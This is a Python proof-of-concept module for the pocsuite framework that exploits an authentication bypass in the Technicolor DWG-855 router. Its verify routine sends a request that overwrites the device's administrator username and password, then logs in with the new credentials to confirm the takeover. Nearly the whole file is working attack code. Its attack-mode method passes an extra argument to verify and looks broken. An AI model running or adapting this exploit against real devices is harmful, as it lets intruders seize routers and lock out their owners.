#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register



class TestPOC(POCBase):
    name = "Technicolor DWG-855 Auth Bypass"
    vulID = ''
    author = ['sebao']
    vulType = 'DNS Change'
    version = '1.0'  # default version: 1.0
    references = ''
    desc = 'Module exploits Technicolor DWG-855 Authentication Bypass vulnerability which allows changing administrator\'s password.\n\nNOTE: This module will errase previous credentials, this is NOT stealthy.'

    vulDate = ''
    createDate = '2017-10-26'
    updateDate = '2017-10-26'

    appName = 'Technicolor DWG-855'
    appVersion = ''
    dork = ''
    appPowerLink = ''
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        nuser = 'ruser'
        npass = 'rpass'
        url = self.url + "/goform/RgSecurity"
        headers = {u'Content-Type': u'application/x-www-form-urlencoded'}
        data = {"HttpUserId": nuser, "Password": npass, "PasswordReEnter": npass,"RestoreFactoryNo": "0x00"}
        resp = req.post(url,data=data,headers=headers)
        if resp.status_code == 401 :
            info_url = self.url + '/RgSwInfo.asp'
            check_response = req.get(info_url,auth=(nuser, npass))
            if check_response.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Username'] = nuser
                result['VerifyInfo']['Password'] = npass


        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
